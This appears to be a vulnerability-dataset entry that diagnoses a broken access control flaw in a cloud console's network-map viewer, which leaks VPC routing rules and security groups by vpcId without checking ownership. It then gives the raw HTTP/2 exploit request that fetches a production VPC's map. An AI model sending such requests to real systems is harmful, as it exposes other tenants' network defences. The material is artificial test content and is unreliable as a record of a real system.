diagnosis: The cloud console topology viewer uses HTTP/2 server push to stream sensitive VPC routing rules and firewall security group definitions based on vpcId from the query string without validating that the authenticated user owns or has IAM rights over the VPC.
exploit_request:
GET /cloud/network-map?vpcId=vpc-enterprise-prod-001 HTTP/2
Host: cloud-console.internal:8449
Accept: text/html
